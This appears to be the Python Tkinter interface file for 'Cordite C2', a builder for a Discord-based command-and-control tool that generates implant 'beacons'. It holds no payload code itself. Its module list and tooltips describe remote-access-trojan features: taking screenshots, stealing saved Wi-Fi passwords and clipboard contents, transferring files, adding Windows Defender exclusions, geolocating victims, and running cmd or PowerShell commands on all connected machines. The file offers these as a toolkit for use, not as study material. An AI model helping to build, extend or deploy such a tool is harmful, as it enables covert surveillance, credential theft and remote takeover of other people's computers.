import tkinter as tk
from tkinter import ttk
from PIL import Image, ImageTk
import logging

def create_ui(app):
    app.main_frame = tk.Frame(app.root, bg="#36393F")
    app.main_frame.pack(fill="both", expand=True)

    app.title_bar = tk.Frame(app.main_frame, bg="#202225", height=30)
    app.title_bar.pack(fill="x")
    tk.Label(app.title_bar, text="Cordite C2", font=("Arial", 12, "bold"), fg="white", bg="#202225").pack(side="left", padx=5)
    tk.Button(app.title_bar, text="X", command=app.close_window, bg="#202225", fg="white", relief="flat").pack(side="right")

    app.server_sidebar = tk.Frame(app.main_frame, bg="#202225", width=72)
    app.server_sidebar.pack(side="left", fill="y")
    try:
        logo_image = Image.open("c2_logo.png")
        logo_image = logo_image.resize((48, 48), Image.LANCZOS)
        app.logo_photo = ImageTk.PhotoImage(logo_image)
        tk.Label(app.server_sidebar, image=app.logo_photo, bg="#202225").pack(pady=10)
    except Exception as e:
        logging.error(f"Failed to load logo image: {e}")
        tk.Label(app.server_sidebar, text="C2", font=("Arial", 16, "bold"), bg="#202225", fg="white").pack(pady=10)

    app.channel_sidebar = tk.Frame(app.main_frame, bg="#2F3136", width=240)
    app.channel_sidebar.pack(side="left", fill="y")
    tk.Label(app.channel_sidebar, text="Cordite Builder", font=("Arial", 14, "bold"), fg="#FFFFFF", bg="#2F3136").pack(pady=(10, 5), anchor="w", padx=10)

    app.channel_frame = tk.Frame(app.channel_sidebar, bg="#2F3136")
    app.channel_frame.pack(fill="y", expand=True)

    app.channels = {
        "setup-discord": app.create_setup_panel,
        "beacon-generation": app.create_beacon_panel,
        "config": app.create_config_panel
    }

    categories = {
        "SETUP": ["setup-discord"],
        "PAYLOADS": ["beacon-generation"],
        "CONFIGURATION": ["config"]
    }
    for category, channel_list in categories.items():
        tk.Label(app.channel_frame, text=category, font=("Arial", 10, "bold"), fg="#72767D", bg="#2F3136").pack(anchor="w", padx=10, pady=(10, 2))
        for channel_name in channel_list:
            btn = tk.Button(app.channel_frame, text=f"# {channel_name.replace('-', ' ')}", font=("Arial", 12), fg="#72767D", bg="#2F3136",
                            relief="flat", anchor="w", command=lambda name=channel_name: app.switch_panel(name))
            btn.pack(fill="x", padx=20, pady=2)

    app.content_frame = tk.Frame(app.main_frame, bg="#36393F")
    app.content_frame.pack(side="left", fill="both", expand=True)
    app.switch_panel("setup-discord")

def censor_text(text):
    if not text:
        return ""
    half_length = len(text) // 2
    return "*" * half_length + text[half_length:]

def create_setup_panel(app):
    panel = tk.Frame(app.content_frame, bg="#36393F")
    app.channel_header = tk.Label(panel, text="# setup-discord", font=("Arial", 16, "bold"), fg="white", bg="#36393F")
    app.channel_header.pack(anchor="w", padx=10, pady=(5, 0))
    tk.Frame(panel, bg="#4F545C", height=1).pack(fill="x", padx=10, pady=(0, 10))

    tk.Label(panel, text="Bot Token:", font=("Arial", 12), fg="#DCDDDE", bg="#36393F").pack(anchor="w", padx=10, pady=5)
    app.token_entry = tk.Entry(panel, width=60, show="*", bg="#40444B", fg="white", insertbackground="white", relief="flat")
    app.token_entry.pack(anchor="w", padx=10, pady=5)

    app.wipe_var = tk.BooleanVar(value=False)
    app.wipe_button = tk.Button(panel, text="Wipe All Channels: OFF", font=("Arial", 10, "bold"), fg="white", bg="#2F3136",
                                activebackground="#5865F2", relief="flat", command=lambda: toggle_wipe_channels(app))
    app.wipe_button.pack(anchor="w", padx=10, pady=5)

    tk.Button(panel, text="Setup Server", command=app.start_setup, bg="#5865F2", fg="white", font=("Arial", 10, "bold"), relief="flat").pack(anchor="w", padx=10, pady=10)

    app.status_label = tk.Label(panel, text="", font=("Arial", 12), fg="#DCDDDE", bg="#36393F", wraplength=600, justify="left")
    app.status_label.pack(anchor="w", padx=10, pady=10)

    return panel

def toggle_wipe_channels(app):
    current_state = app.wipe_var.get()
    app.wipe_var.set(not current_state)
    if app.wipe_var.get():
        app.wipe_button.config(text="Wipe All Channels: ON", bg="#5865F2")
    else:
        app.wipe_button.config(text="Wipe All Channels: OFF", bg="#2F3136")

def create_beacon_panel(app):
    panel = tk.Frame(app.content_frame, bg="#36393F")
    app.channel_header = tk.Label(panel, text="# beacon-generation", font=("Arial", 16, "bold"), fg="white", bg="#36393F")
    app.channel_header.pack(anchor="w", padx=10, pady=(5, 0))
    tk.Frame(panel, bg="#4F545C", height=1).pack(fill="x", padx=10, pady=(0, 10))

    modules_frame = tk.Frame(panel, bg="#36393F")
    modules_frame.pack(fill="x", padx=10, pady=10)

    module_descriptions = {
        "screenshot": "Captures a screenshot of the agent's desktop.",
        "download": "Downloads a file from the agent's system.",
        "upload": "Uploads a file to the agent's system.",
        "wifi": "Retrieves saved Wi-Fi network passwords.",
        "clipboard": "Accesses the agent's clipboard content.",
        "applications": "Lists installed applications on the agent's system.",
        "sysinfo": "Gathers system information (e.g., OS, hardware).",
        "ps": "Lists running processes on the agent's system.",
        "re-register": "Re-registers the agent with the server. (for updating agent list)",
        "defender-exclusion": "Adds an exclusion to Windows Defender. (admin priv needed)",
        "powershell": "Executes PowerShell commands on the agent.",
        "clean-dead": "Cleans up dead agents from beacon chanel.",
        "kill": "Terminates a specified process on the agent's system.",
        "location": "Retrieves the agent's geolocation and displays a map.",
        "cd and dir": "Changes directory and lists files on the agent's system.",
        "runcmd": "Execute cmd commands on the agent (mandatory).",
        "runcmd-all": "Execute cmd command on every connected beacon (mandatory)."
    }

    optional_label = tk.Label(modules_frame, text="Optional Modules", font=("Arial", 12, "bold"), fg="#72767D", bg="#36393F")
    optional_label.grid(row=0, column=0, pady=(0, 2))
    app.optional_listbox = tk.Listbox(modules_frame, height=15, width=25, bg="#2F3136", fg="#DCDDDE",
                                      selectbackground="#5865F2", relief="flat", font=("Arial", 12),
                                      selectmode="multiple", highlightthickness=0)
    app.optional_listbox.grid(row=1, column=0, padx=(0, 5), pady=0)
    optional_modules = ["screenshot", "download", "upload", "wifi", "clipboard", "applications", "sysinfo", "ps",
                        "re-register", "defender-exclusion", "powershell", "clean-dead", "kill", "location", "cd and dir"]
    for module in optional_modules:
        app.optional_listbox.insert(tk.END, module)

    installed_label = tk.Label(modules_frame, text="Installed Modules", font=("Arial", 12, "bold"), fg="#72767D", bg="#36393F")
    installed_label.grid(row=0, column=2, pady=(0, 2))
    app.installed_listbox = tk.Listbox(modules_frame, height=15, width=25, bg="#2F3136", fg="#DCDDDE",
                                       selectbackground="#5865F2", relief="flat", font=("Arial", 12),
                                       selectmode="multiple", highlightthickness=0)
    app.installed_listbox.grid(row=1, column=2, padx=(5, 0), pady=0)
    installed_modules = ["runcmd", "runcmd-all"]
    for module in installed_modules:
        app.installed_listbox.insert(tk.END, module)

    def create_motion_handler(listbox):
        def on_motion(event):
            index = listbox.nearest(event.y)
            if index >= 0 and index < listbox.size():
                module = listbox.get(index)
                if getattr(app, 'last_hovered_module', None) != module:
                    if hasattr(app, 'tooltip_after_id') and app.tooltip_after_id:
                        app.root.after_cancel(app.tooltip_after_id)
                    app.tooltip_after_id = app.root.after(100, lambda: show_tooltip(app, event, listbox, module, module_descriptions.get(module, "No description available")))
                    app.last_hovered_module = module
            else:
                hide_tooltip(app)
        return on_motion

    def on_leave(event):
        if hasattr(app, 'tooltip_after_id') and app.tooltip_after_id:
            app.root.after_cancel(app.tooltip_after_id)
            app.tooltip_after_id = None
        app.last_hovered_module = None
        hide_tooltip(app)

    app.optional_listbox.bind("<Motion>", create_motion_handler(app.optional_listbox))
    app.optional_listbox.bind("<Leave>", on_leave)
    app.installed_listbox.bind("<Motion>", create_motion_handler(app.installed_listbox))
    app.installed_listbox.bind("<Leave>", on_leave)

    buttons_frame = tk.Frame(modules_frame, bg="#36393F")
    buttons_frame.grid(row=1, column=1, padx=5, sticky="ns")
    move_selected_right_btn = tk.Button(buttons_frame, text=">", font=("Arial", 10, "bold"), fg="white", bg="#5865F2",
                                        relief="flat", width=2, command=lambda: move_selected_right(app))
    move_selected_right_btn.pack(pady=5)
    move_all_right_btn = tk.Button(buttons_frame, text=">>", font=("Arial", 10, "bold"), fg="white", bg="#5865F2",
                                   relief="flat", width=2, command=lambda: move_all_right(app))
    move_all_right_btn.pack(pady=5)
    move_selected_left_btn = tk.Button(buttons_frame, text="<", font=("Arial", 10, "bold"), fg="white", bg="#5865F2",
                                       relief="flat", width=2, command=lambda: move_selected_left(app))
    move_selected_left_btn.pack(pady=5)
    move_all_left_btn = tk.Button(buttons_frame, text="<<", font=("Arial", 10, "bold"), fg="white", bg="#5865F2",
                                  relief="flat", width=2, command=lambda: move_all_left(app))
    move_all_left_btn.pack(pady=5)

    app.debug_mode_var = tk.BooleanVar(value=False)
    debug_frame = tk.Frame(panel, bg="#36393F")
    debug_frame.pack(anchor="w", padx=10, pady=5)
    app.debug_button = tk.Button(debug_frame, text="Debug Mode: OFF", font=("Arial", 10, "bold"), fg="white",
                                 bg="#2F3136", activebackground="#5865F2", relief="flat",
                                 command=lambda: toggle_debug_mode(app))
    app.debug_button.pack()

    app.build_button = tk.Button(panel, text="Build Solution", command=app.build_solution, bg="#5865F2", fg="white",
                                 font=("Arial", 10, "bold"), relief="flat")
    app.build_button.pack(anchor="w", padx=10, pady=10)

    app.build_status_label = tk.Label(panel, text="", font=("Arial", 12), fg="#DCDDDE", bg="#36393F", wraplength=600,
                                      justify="left")
    app.build_status_label.pack(anchor="w", padx=10, pady=5)

    app.progress_bar = ttk.Progressbar(panel, orient="horizontal", length=200, mode="indeterminate")
    app.progress_bar.pack(anchor="w", padx=10, pady=5)
    app.progress_bar.pack_forget()

    return panel

def show_tooltip(app, event, listbox, module, description):
    if hasattr(app, 'tooltip') and app.tooltip:
        app.tooltip.destroy()

    app.tooltip = tk.Toplevel(app.root)
    app.tooltip.wm_overrideredirect(True)
    app.tooltip.wm_attributes("-topmost", True)

    index = listbox.nearest(event.y)
    bbox = listbox.bbox(index) if index >= 0 else (0, 0, 0, 20)
    item_height = bbox[3] if bbox else 20
    x = listbox.winfo_rootx() + 10
    y = listbox.winfo_rooty() + bbox[1] + item_height // 2

    tooltip_width = 220
    tooltip_height = 60
    screen_width = app.root.winfo_screenwidth()
    screen_height = app.root.winfo_screenheight()
    if x + tooltip_width > screen_width:
        x = listbox.winfo_rootx() - tooltip_width - 10
    if y + tooltip_height > screen_height:
        y -= tooltip_height

    app.tooltip.wm_geometry(f"+{x}+{y}")

    label = tk.Label(app.tooltip, text=description, bg="#40444B", fg="white", font=("Arial", 10),
                     relief="solid", borderwidth=1, wraplength=200, justify="left", padx=5, pady=5)
    label.pack()

def hide_tooltip(app):
    if hasattr(app, 'tooltip') and app.tooltip:
        app.tooltip.destroy()
        app.tooltip = None

def move_selected_right(app):
    selected_indices = app.optional_listbox.curselection()
    for index in reversed(selected_indices):
        module = app.optional_listbox.get(index)
        app.installed_listbox.insert(tk.END, module)
        app.optional_listbox.delete(index)
    logging.info(f"After move right, installed modules: {app.installed_listbox.get(0, tk.END)}")

def move_all_right(app):
    while app.optional_listbox.size() > 0:
        module = app.optional_listbox.get(0)
        app.installed_listbox.insert(tk.END, module)
        app.optional_listbox.delete(0)
    logging.info(f"After move all right, installed modules: {app.installed_listbox.get(0, tk.END)}")

def move_selected_left(app):
    selected_indices = app.installed_listbox.curselection()
    mandatory_modules = {"runcmd", "runcmd-all"}
    for index in reversed(selected_indices):
        module = app.installed_listbox.get(index)
        if module not in mandatory_modules:
            app.optional_listbox.insert(tk.END, module)
            app.installed_listbox.delete(index)
    logging.info(f"After move left, installed modules: {app.installed_listbox.get(0, tk.END)}")

def move_all_left(app):
    mandatory_modules = {"runcmd", "runcmd-all"}
    app.installed_listbox.delete(0, tk.END)
    for module in app.optional_listbox.get(0, tk.END):
        app.optional_listbox.delete(0)
    optional_modules = ["screenshot", "download", "upload", "wifi", "clipboard", "applications",
                        "sysinfo", "ps", "re-register", "defender-exclusion", "powershell",
                        "clean-dead", "kill", "location", "cd and dir"]
    for module in optional_modules:
        app.optional_listbox.insert(tk.END, module)
    for module in mandatory_modules:
        app.installed_listbox.insert(tk.END, module)
    logging.info(f"After move all left, installed modules: {app.installed_listbox.get(0, tk.END)}")

def toggle_debug_mode(app):
    current_state = app.debug_mode_var.get()
    app.debug_mode_var.set(not current_state)
    if app.debug_mode_var.get():
        app.debug_button.config(text="Debug Mode: ON", bg="#5865F2")
    else:
        app.debug_button.config(text="Debug Mode: OFF", bg="#2F3136")

def create_config_panel(app):
    panel = tk.Frame(app.content_frame, bg="#36393F")
    app.channel_header = tk.Label(panel, text="# config", font=("Arial", 16, "bold"), fg="white", bg="#36393F")
    app.channel_header.pack(anchor="w", padx=10, pady=(5, 0))
    tk.Frame(panel, bg="#4F545C", height=1).pack(fill="x", padx=10, pady=(0, 10))

    tk.Label(panel, text="Bot Token:", font=("Arial", 12), fg="#DCDDDE", bg="#36393F").pack(anchor="w", padx=10, pady=5)
    app.config_token_entry = tk.Entry(panel, width=75, bg="#40444B", fg="white", insertbackground="white", relief="flat")
    app.config_token_entry.insert(0, censor_text(app.bot_token))
    app.config_token_entry.pack(anchor="w", padx=10, pady=5)

    tk.Label(panel, text="Application ID:", font=("Arial", 12), fg="#DCDDDE", bg="#36393F").pack(anchor="w", padx=10, pady=5)
    app.app_id_entry = tk.Entry(panel, width=50, bg="#40444B", fg="white", insertbackground="white", relief="flat")
    app.app_id_entry.insert(0, censor_text(app.app_id))
    app.app_id_entry.pack(anchor="w", padx=10, pady=5)

    tk.Label(panel, text="CMake Path:", font=("Arial", 12), fg="#DCDDDE", bg="#36393F").pack(anchor="w", padx=10, pady=5)
    app.cmake_path_entry = tk.Entry(panel, width=75, bg="#40444B", fg="white", insertbackground="white", relief="flat")
    app.cmake_path_entry.insert(0, app.cmake_path)
    app.cmake_path_entry.pack(anchor="w", padx=10, pady=5)

    tk.Label(panel, text="Channel IDs:", font=("Arial", 12), fg="#DCDDDE", bg="#36393F").pack(anchor="w", padx=10, pady=5)
    app.channel_entries = {}
    for channel_name in ["beacons", "commands", "uploads", "downloads"]:
        frame = tk.Frame(panel, bg="#36393F")
        frame.pack(anchor="w", padx=10, pady=2)
        tk.Label(frame, text=f"{channel_name}:", font=("Arial", 12), fg="#DCDDDE", bg="#36393F", width=10).pack(side="left")
        entry = tk.Entry(frame, width=40, bg="#40444B", fg="white", insertbackground="white", relief="flat")
        entry.insert(0, app.channel_ids.get(channel_name, ""))
        entry.pack(side="left")
        app.channel_entries[channel_name] = entry

    tk.Label(panel, text="Timezone:", font=("Arial", 12), fg="#DCDDDE", bg="#36393F").pack(anchor="w", padx=10, pady=5)
    timezone_frame = tk.Frame(panel, bg="#36393F")
    timezone_frame.pack(anchor="w", padx=10, pady=5)

    timezone_options = [
        ("Europe/Budapest", -60, True), ("America/New_York", 300, True), ("America/Los_Angeles", 480, True),
        ("Europe/London", 0, True), ("Asia/Tokyo", -540, False), ("Australia/Sydney", -600, True),
        ("Asia/Dubai", -240, False), ("Europe/Paris", -60, True), ("Asia/Shanghai", -480, False),
        ("America/Sao_Paulo", 180, True),
    ]
    app.timezone_var = tk.StringVar(value="Europe/Budapest")
    app.timezone_data = {tz[0]: {"offset": tz[1], "dst": tz[2]} for tz in timezone_options}

    dropdown_button = tk.Button(timezone_frame, textvariable=app.timezone_var, bg="#40444B", fg="white",
                                font=("Arial", 12), relief="flat", anchor="w", width=30, padx=10, pady=5,
                                activebackground="#5865F2", activeforeground="white")
    dropdown_button.pack(side="left")

    def show_dropdown(event):
        menu = tk.Menu(app.root, tearoff=0, bg="#2F3136", fg="white", font=("Arial", 12),
                       activebackground="#5865F2", activeforeground="white", borderwidth=0)
        for tz_name, _, _ in timezone_options:
            menu.add_command(label=tz_name, command=lambda t=tz_name: app.timezone_var.set(t))
        menu.post(event.x_root, event.y_root)

    dropdown_button.bind("<Button-1>", show_dropdown)

    tk.Button(panel, text="Save Config", command=app.save_config_from_panel, bg="#5865F2", fg="white",
              font=("Arial", 10, "bold"), relief="flat").pack(anchor="w", padx=10, pady=10)
    app.config_status_label = tk.Label(panel, text="", font=("Arial", 12), fg="#DCDDDE", bg="#36393F", wraplength=600,
                                       justify="left")
    app.config_status_label.pack(anchor="w", padx=10, pady=10)
    return panel